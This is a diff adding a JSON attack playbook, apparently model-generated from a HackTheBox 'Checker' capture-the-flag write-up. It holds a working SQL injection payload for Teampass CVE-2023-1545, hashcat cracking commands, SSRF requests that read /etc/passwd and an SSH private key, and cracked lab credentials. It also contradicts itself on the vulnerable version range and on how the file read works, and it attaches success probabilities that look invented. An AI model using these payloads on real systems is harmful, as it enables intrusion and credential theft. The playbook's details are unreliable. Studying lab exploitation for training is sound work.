@@ -1,0 +1,893 @@
+{
+  "writeup_id": "Htb_Checker",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_app_sqli_to_ssrf_privilege_escalation",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80+8080",
+    "service_combination": "ssh+dual_http",
+    "os_family": "linux",
+    "environment_type": "web_application_server",
+    "entry_vector": "sql_injection",
+    "privilege_path": "sqli_to_ssrf_to_race_condition_root",
+    "attack_complexity": "hard",
+    "estimated_time": "3-4 hours",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "teampass_bookstack_combo",
+      "blind_php_filter_oracle",
+      "shared_memory_race_condition",
+      "two_factor_bypass_via_ssrf"
+    ],
+    "environmental_clues": [
+      "dual_web_applications",
+      "rate_limiting_protection",
+      "host_based_routing",
+      "custom_404_pages",
+      "laravel_framework_cookies"
+    ],
+    "similar_scenarios": [
+      "multi_webapp_ctf_boxes",
+      "complex_web_exploitation"
+    ],
+    "unique_aspects": [
+      "teampass_sqli_vulnerability",
+      "bookstack_ssrf_exploitation",
+      "php_filter_oracle_technique",
+      "memory_poisoning_privesc"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SQL_Injection_CVE-2023-1545",
+        "success_reason": "Teampass /authorize endpoint vulnerable to union-based SQL injection",
+        "prerequisite_indicators": [
+          "teampass_api_enabled",
+          "version_prior_to_3.0.0.23",
+          "post_method_accepted"
+        ],
+        "recognition_patterns": [
+          "teampass login page accessible",
+          "changelog.txt shows 2009-2022 copyright",
+          "API endpoint returns method error not disabled error",
+          "union select injection successful"
+        ],
+        "failure_modes": [
+          "api_disabled",
+          "patched_version",
+          "input_sanitization_enabled",
+          "waf_blocking_injection"
+        ],
+        "environmental_factors": [
+          "unpatched_teampass_installation",
+          "default_api_configuration",
+          "no_input_validation"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "SSRF_PHP_Filter_Oracle",
+        "success_reason": "BookStack SSRF vulnerability combined with PHP filter chains for file read",
+        "prerequisite_indicators": [
+          "bookstack_accessible",
+          "valid_user_credentials",
+          "ssrf_endpoint_available",
+          "php_filters_not_blocked"
+        ],
+        "recognition_patterns": [
+          "bookstack login successful",
+          "ssrf functionality in application",
+          "php filter chains work",
+          "blind oracle responses differ"
+        ],
+        "failure_modes": [
+          "ssrf_patched",
+          "php_filters_disabled",
+          "file_not_readable",
+          "oracle_responses_identical"
+        ],
+        "environmental_factors": [
+          "bookstack_v23.10.2",
+          "php_configuration_allows_filters",
+          "backup_files_accessible"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "45-90 minutes"
+      },
+      {
+        "technique": "Shared_Memory_Race_Condition",
+        "success_reason": "Custom binary uses shared memory without proper synchronization",
+        "prerequisite_indicators": [
+          "custom_suid_binary_present",
+          "shared_memory_usage_detected",
+          "race_condition_window_exists"
+        ],
+        "recognition_patterns": [
+          "suid binary with shared memory calls",
+          "timing window for memory poisoning",
+          "predictable memory layout",
+          "execution flow controllable"
+        ],
+        "failure_modes": [
+          "proper_synchronization",
+          "memory_randomization",
+          "timing_window_too_small",
+          "input_validation_present"
+        ],
+        "environmental_factors": [
+          "linux_shared_memory_available",
+          "predictable_execution_timing",
+          "no_memory_protection"
+        ],
+        "success_probability": 0.68,
+        "typical_timeframe": "60-120 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Teampass SQL injection vulnerability",
+        "discovery_method": "CVE research and version analysis",
+        "why_critical": "Enabled extraction of user password hashes from database",
+        "how_to_recognize": [
+          "teampass version 3.x prior to 3.0.0.23",
+          "copyright year 2009-2022 in changelog",
+          "API endpoint accessible",
+          "union select injection works"
+        ],
+        "follow_up_actions": [
+          "extract_user_hashes",
+          "crack_passwords_with_hashcat",
+          "test_credentials_on_other_services",
+          "enumerate_database_further"
+        ]
+      },
+      {
+        "discovery": "BookStack credentials in Teampass",
+        "discovery_method": "SQL injection data extraction",
+        "why_critical": "Provided access to BookStack application for further exploitation",
+        "how_to_recognize": [
+          "password manager contains service credentials",
+          "bookstack admin or user accounts",
+          "credential reuse patterns",
+          "service account naming conventions"
+        ],
+        "follow_up_actions": [
+          "login_to_bookstack",
+          "enumerate_bookstack_functionality",
+          "look_for_ssrf_opportunities",
+          "check_for_file_access"
+        ]
+      },
+      {
+        "discovery": "Two-factor authentication seed in backup",
+        "discovery_method": "SSRF with PHP filter oracle to read files",
+        "why_critical": "Bypassed 2FA protection on SSH access",
+        "how_to_recognize": [
+          "backup files contain sensitive data",
+          "2fa seeds stored in plaintext",
+          "ssrf can read local files",
+          "php filter chains work for file extraction"
+        ],
+        "follow_up_actions": [
+          "generate_totp_codes",
+          "access_ssh_with_2fa",
+          "enumerate_system_as_user",
+          "look_for_privilege_escalation"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated",
+        "escalation_method": "SQL_injection_to_credentials",
+        "why_possible": "Unpatched Teampass with API enabled and vulnerable endpoint",
+        "recognition_signs": [
+          "teampass_login_page",
+          "api_endpoint_responds",
+          "version_indicators_vulnerable",
+          "union_injection_successful"
+        ],
+        "exploitation_path": "SQL injection → Hash extraction → Password cracking → Service access"
+      },
+      {
+        "privilege_level": "bookstack_user",
+        "escalation_method": "SSRF_to_file_read",
+        "why_possible": "BookStack SSRF vulnerability allows local file access via PHP filters",
+        "recognition_signs": [
+          "ssrf_functionality_present",
+          "php_filters_allowed",
+          "backup_files_readable",
+          "sensitive_data_in_backups"
+        ],
+        "exploitation_path": "SSRF → PHP filter oracle → File read → 2FA seed → SSH access"
+      },
+      {
+        "privilege_level": "user_shell",
+        "escalation_method": "Race_condition_privilege_escalation",
+        "why_possible": "Custom SUID binary with shared memory race condition",
+        "recognition_signs": [
+          "custom_suid_binary",
+          "shared_memory_usage",
+          "timing_window_exploitable",
+          "memory_poisoning_possible"
+        ],
+        "exploitation_path": "Race condition → Memory poisoning → Code execution → Root shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,8080 open with HTTP services returning 403",
+        "decision": "Check for host-based routing and virtual hosts",
+        "reasoning": "403 responses often indicate host header filtering or virtual host configuration",
+        "confidence": 0.85,
+        "alternatives": [
+          {
+            "option": "directory_bruteforce",
+            "when": "if no virtual hosts found"
+          },
+          {
+            "option": "check_default_pages",
+            "when": "if direct IP access fails"
+          }
+        ],
+        "success_indicators": [
+          "redirect_to_hostname",
+          "different_content_with_host_header",
+          "application_loads_properly"
+        ],
+        "next_decision": "identify_web_applications"
+      },
+      {
+        "step": 2,
+        "situation": "Discovered BookStack on port 80 and Teampass on port 8080",
+        "decision": "Target Teampass first for known vulnerabilities",
+        "reasoning": "Password managers often contain credentials for other systems, higher value target",
+        "confidence": 0.9,
+        "prerequisites": [
+          "applications_identified",
+          "versions_enumerated"
+        ],
+        "success_indicators": [
+          "cve_matches_version",
+          "exploit_available"
+        ],
+        "failure_fallbacks": [
+          "bookstack_enumeration",
+          "credential_guessing",
+          "directory_bruteforce"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Teampass version 3.0.0.x identified (pre-3.0.0.23)",
+        "decision": "Exploit CVE-2023-1545 SQL injection in /authorize endpoint",
+        "reasoning": "Version matches vulnerable range and SQL injection can extract password hashes",
+        "confidence": 0.95,
+        "prerequisites": [
+          "api_endpoint_accessible",
+          "version_vulnerable"
+        ],
+        "success_indicators": [
+          "sql_injection_successful",
+          "user_hashes_extracted"
+        ],
+        "next_decision": "crack_extracted_hashes"
+      },
+      {
+        "step": 4,
+        "situation": "Extracted bcrypt hashes from Teampass database",
+        "decision": "Crack hashes with common wordlists before advanced techniques",
+        "reasoning": "Bcrypt is slow to crack, start with high-probability passwords first",
+        "confidence": 0.8,
+        "alternatives": [
+          {
+            "option": "rule_based_attacks",
+            "when": "if wordlist fails"
+          },
+          {
+            "option": "mask_attacks",
+            "when": "if patterns identified"
+          }
+        ],
+        "success_indicators": [
+          "password_cracked",
+          "credentials_validated"
+        ],
+        "next_decision": "test_credential_reuse"
+      }
+    ],
+    "branching_logic": {
+      "if_sqli_succeeds": {
+        "action": "extract_all_user_data",
+        "tools": [
+          "custom_script",
+          "sqlmap"
+        ],
+        "next_phase": "credential_cracking"
+      },
+      "if_hash_cracks": {
+        "action": "test_credential_reuse_across_services",
+        "targets": [
+          "bookstack",
+          "ssh",
+          "other_discovered_services"
+        ],
+        "next_phase": "lateral_movement"
+      },
+      "if_bookstack_access_gained": {
+        "action": "enumerate_stored_credentials",
+        "purpose": "find_ssh_or_system_credentials",
+        "tools": [
+          "manual_browsing",
+          "api_enumeration"
+        ]
+      },
+      "if_ssh_has_2fa": {
+        "action": "look_for_2fa_bypass_or_seed_extraction",
+        "methods": [
+          "backup_files",
+          "config_files",
+          "ssrf_attacks"
+        ],
+        "next_phase": "2fa_bypass"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_api_endpoints_on_password_managers",
+        "reasoning": "password_managers_often_have_api_vulnerabilities_and_contain_high_value_data",
+        "applicability": "teampass_nextcloud_bitwarden_etc"
+      },
+      {
+        "rule": "test_credential_reuse_immediately_after_crack",
+        "reasoning": "users_often_reuse_passwords_across_multiple_services",
+        "applicability": "any_cracked_credentials"
+      },
+      {
+        "rule": "prioritize_password_manager_exploitation",
+        "reasoning": "contains_credentials_for_multiple_systems_high_impact",
+        "applicability": "multiple_applications_discovered"
+      },
+      {
+        "rule": "check_for_2fa_seed_in_backups_when_2fa_blocks_access",
+        "reasoning": "backup_files_often_contain_2fa_seeds_or_recovery_codes",
+        "applicability": "ssh_or_application_with_2fa_enabled"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SQL_Injection_Teampass",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "teampass"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "teampass_application_detected",
+          "version_3.0.0.10_to_3.0.0.21",
+          "unauthenticated_access_possible"
+        ],
+        "success_indicators": [
+          "changelog_txt_accessible",
+          "copyright_year_2009_2022",
+          "sql_injection_response_received"
+        ],
+        "incompatible_with": [
+          "teampass_version_3.0.0.22_or_higher",
+          "authentication_required",
+          "waf_blocking_requests"
+        ],
+        "confidence_boosters": [
+          "teampass_login_page_present",
+          "php_application_detected",
+          "vulnerable_version_indicators"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "SSRF_BookStack",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "bookstack"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "bookstack_application_detected",
+          "authenticated_access_available",
+          "php_filter_functionality_present"
+        ],
+        "success_indicators": [
+          "bookstack_version_v23.10.2",
+          "laravel_framework_detected",
+          "ssrf_endpoint_accessible"
+        ],
+        "incompatible_with": [
+          "ssrf_protections_enabled",
+          "file_access_restrictions",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "bookstack_session_cookies",
+          "php_laravel_indicators",
+          "backup_files_present"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "30-60 minutes"
+      },
+      {
+        "technique": "Hash_Cracking",
+        "mitre_id": "T1110.002",
+        "required_services": [
+          "any"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "password_hashes_obtained",
+          "weak_passwords_likely",
+          "common_wordlists_available"
+        ],
+        "success_indicators": [
+          "hashes_extracted_successfully",
+          "hash_format_identified",
+          "cracking_tool_available"
+        ],
+        "incompatible_with": [
+          "strong_password_policy",
+          "salted_hashes_only",
+          "rate_limiting_on_attempts"
+        ],
+        "confidence_boosters": [
+          "default_credentials_present",
+          "password_reuse_patterns",
+          "weak_hash_algorithms"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "5-120 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "teampass_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Teampass",
+          "password manager"
+        ],
+        "file_indicators": [
+          "changelog.txt",
+          "index.php"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "bookstack_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "BookStack",
+          "Laravel"
+        ],
+        "cookie_indicators": [
+          "bookstack_session",
+          "XSRF-TOKEN"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "php_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "php",
+          "laravel"
+        ],
+        "file_indicators": [
+          "index.php",
+          ".php"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "sql_injection_teampass",
+          "when": "teampass_detected_vulnerable_version",
+          "reason": "unauthenticated_access_high_success_rate"
+        },
+        {
+          "attack": "hash_cracking",
+          "when": "hashes_obtained_from_sql_injection",
+          "reason": "often_leads_to_credential_reuse"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "ssrf_bookstack",
+          "when": "bookstack_authenticated_access_available",
+          "reason": "can_lead_to_file_disclosure_and_rce"
+        },
+        {
+          "attack": "credential_stuffing",
+          "when": "credentials_obtained_multiple_services",
+          "reason": "password_reuse_common"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "rate_limiting_detected",
+          "reason": "time_consuming_with_restrictions"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SQL Injection via API Endpoint",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl --silent --header \"Content-Type: application/json\" -X POST --data \"{\\\"login\\\":\\\"{injection_payload}\\\",\\\"password\\\":\\\"h4ck3d\\\", \\\"apikey\\\": \\\"foo\\\"}\" {target_url}/api/index.php/authorize",
+            "actual_command": "curl --silent --header \"Content-Type: application/json\" -X POST --data \"{\\\"login\\\":\\\"none' UNION SELECT id, '$arbitrary_hash', (SELECT COUNT(*) FROM teampass_users WHERE pw != ''), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin\\\",\\\"password\\\":\\\"h4ck3d\\\", \\\"apikey\\\": \\\"foo\\\"}\" http://10.10.11.56:8080/api/index.php/authorize",
+            "output_pattern": "JWT token with leaked data in payload",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "jq",
+            "command_template": "echo {jwt_token} | cut -d\".\" -f2 | base64 -d | jq -r '.public_key'",
+            "actual_command": "echo $token| cut -d\".\" -f2 | base64 -d 2>/dev/null | jq -r '.public_key'",
+            "success_factors": [
+              "api_enabled",
+              "vulnerable_teampass_version"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "teampass_api_enabled",
+          "vulnerable_version_3.0.0.22_or_below",
+          "network_access_to_api_endpoint"
+        ],
+        "success_indicators": [
+          "jwt_token_returned",
+          "user_data_extracted_from_jwt",
+          "password_hashes_retrieved"
+        ],
+        "common_failures": [
+          "api_disabled",
+          "patched_version",
+          "waf_blocking_requests"
+        ],
+        "follow_up_techniques": [
+          "hash_cracking",
+          "credential_reuse_testing",
+          "application_authentication"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Hash Cracking - bcrypt",
+        "mitre_id": "T1110.002",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "hashcat",
+            "command_template": "hashcat {hash_file} {wordlist} --user -m 3200",
+            "actual_command": "hashcat teampass.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 3200",
+            "output_pattern": "$2y$10$hash:password",
+            "effectiveness_rating": 4,
+            "reliability": 0.75
+          }
+        ],
+        "prerequisites": [
+          "extracted_password_hashes",
+          "appropriate_wordlist",
+          "sufficient_compute_power"
+        ],
+        "success_indicators": [
+          "password_cracked_successfully",
+          "plaintext_credentials_obtained"
+        ],
+        "common_failures": [
+          "strong_passwords_resist_cracking",
+          "insufficient_wordlist_coverage",
+          "time_constraints"
+        ],
+        "follow_up_techniques": [
+          "credential_validation",
+          "lateral_movement",
+          "privilege_escalation"
+        ],
+        "time_investment": "minutes to hours",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "SSRF via BookStack Draft Save",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST {bookstack_url}/ajax/page/{page_id}/save-draft -H \"Content-Type: application/json\" -d '{\"html\":\"file://{target_file}\"}'",
+            "actual_command": "curl -X POST http://checker.htb/ajax/page/1/save-draft -H \"Content-Type: application/json\" -d '{\"html\":\"file:///etc/passwd\"}'",
+            "output_pattern": "File contents in response",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "authenticated_bookstack_access",
+          "vulnerable_bookstack_version_23.10.2",
+          "valid_page_id"
+        ],
+        "success_indicators": [
+          "local_file_contents_returned",
+          "ssrf_response_received",
+          "sensitive_data_exposed"
+        ],
+        "common_failures": [
+          "file_permissions_deny_access",
+          "invalid_page_id",
+          "patched_version"
+        ],
+        "follow_up_techniques": [
+          "sensitive_file_enumeration",
+          "configuration_file_reading",
+          "backup_file_discovery"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "CVE-2023-1545 POC Script",
+        "use_case": "teampass_sql_injection_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "teampass_exploitation"
+        ],
+        "alternatives": [
+          "manual_sql_injection",
+          "sqlmap"
+        ],
+        "best_practices": [
+          "verify_api_enabled_first",
+          "check_version_compatibility",
+          "extract_all_user_data_systematically"
+        ]
+      },
+      {
+        "tool": "hashcat",
+        "use_case": "bcrypt_hash_cracking",
+        "effectiveness_rating": 4,
+        "reliability": 0.75,
+        "learning_curve": "low",
+        "essential_for": [
+          "password_recovery"
+        ],
+        "alternatives": [
+          "john_the_ripper",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "use_appropriate_hash_mode",
+          "start_with_common_wordlists",
+          "leverage_gpu_acceleration"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "teampass_to_bookstack_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl http://10.10.11.56:8080/api/index.php/authorize",
+            "purpose": "Verify API is enabled",
+            "expected_output": "Method GET not supported (not API usage not allowed)"
+          },
+          {
+            "step": 2,
+            "command": "bash cve-2023-1545.sh http://10.10.11.56:8080",
+            "purpose": "Extract user hashes via SQL injection",
+            "expected_output": "admin and bob password hashes"
+          },
+          {
+            "step": 3,
+            "command": "hashcat teampass.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 3200",
+            "purpose": "Crack extracted hashes",
+            "expected_output": "bob:cheerleader"
+          },
+          {
+            "step": 4,
+            "command": "Login to Teampass with bob:cheerleader",
+            "purpose": "Access password manager",
+            "expected_output": "BookStack and SSH credentials revealed"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "bookstack_ssrf_file_read",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Login to BookStack with bob@checker.htb:mYSeCr3T_w1kI_P4sSw0rD",
+            "purpose": "Authenticate to BookStack",
+            "expected_output": "Successful login and dashboard access"
+          },
+          {
+            "step": 2,
+            "command": "curl -X POST http://checker.htb/ajax/page/1/save-draft -H \"Content-Type: application/json\" -d '{\"html\":\"file:///etc/passwd\"}'",
+            "purpose": "Test SSRF file read capability",
+            "expected_output": "Contents of /etc/passwd"
+          },
+          {
+            "step": 3,
+            "command": "curl -X POST http://checker.htb/ajax/page/1/save-draft -H \"Content-Type: application/json\" -d '{\"html\":\"file:///backup/home_backup/.ssh/id_rsa\"}'",
+            "purpose": "Extract SSH private keys from backup",
+            "expected_output": "SSH private key contents"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Checker",
+      "difficulty": "Hard",
+      "os": "Ubuntu 22.04",
+      "platform": "HackTheBox",
+      "release_date": "2025-02-22",
+      "author": "0xyassine",
+      "estimated_time": "4-6 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "high",
+      "skill_level_required": "advanced",
+      "primary_attack_vectors": [
+        "sql_injection",
+        "ssrf",
+        "race_condition"
+      ],
+      "key_vulnerabilities": [
+        "teampass_sqli",
+        "bookstack_ssrf",
+        "shared_memory_poisoning"
+      ],
+      "environment_type": "web_applications_multi_service",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "advanced_sqli",
+        "blind_php_filters",
+        "memory_corruption",
+        "2fa_bypass"
+      ],
+      "prerequisite_knowledge": [
+        "web_exploitation",
+        "php_filters",
+        "linux_internals",
+        "race_conditions"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "sql_injection",
+        "ssrf",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "credential_access",
+        "server_side_request_forgery",
+        "race_condition"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "ssrf_protection",
+        "secure_memory_handling",
+        "2fa_implementation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bolt",
+        "Previse",
+        "Writer"
+      ],
+      "similarity_reasons": [
+        "complex_web_exploitation",
+        "multiple_services",
+        "advanced_techniques"
+      ],
+      "unique_aspects": [
+        "blind_php_filter_oracle",
+        "shared_memory_poisoning",
+        "2fa_seed_extraction"
+      ],
+      "difficulty_factors": [
+        "complex_attack_chain",
+        "advanced_exploitation_techniques",
+        "race_condition_timing"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T02:53:01.746964",
+    "original_file": "0xdf_writeups/Htb Checker.md",
+    "content_length": 41024,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
